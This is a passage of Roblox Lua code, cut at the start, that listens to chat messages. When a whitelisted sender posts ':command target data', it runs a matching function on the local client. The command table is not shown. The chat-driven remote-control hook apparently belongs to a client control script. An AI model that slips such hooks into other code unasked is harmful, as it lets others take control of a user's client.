            return Player
        end
    end
    return nil
end

TextChatService.OnIncomingMessage = function(message)
    local sender = message.TextSource
    if not sender then return end

    local senderName = sender.Name
    if not isWhitelisted(senderName) then return end

    local lowerMsg = message.Text:lower()
    if string.sub(lowerMsg, 1, 1) == ":" then
        local args = string.split(string.sub(lowerMsg, 2), " ")
        local Command = table.remove(args, 1)
        local TargetName = table.remove(args, 1)
        local Data = table.concat(args, " ")

        if Command and TargetName and cmds[Command] then
            Command = Command:lower()
            local Target = FindMatch(TargetName)
            if TargetName == "all" or Target == LocalPlayer or TargetName:lower() == LocalPlayer.Name:lower() then
                pcall(function()
                    cmds[Command](sender, Data)
                end)
            end
        end
    end
end
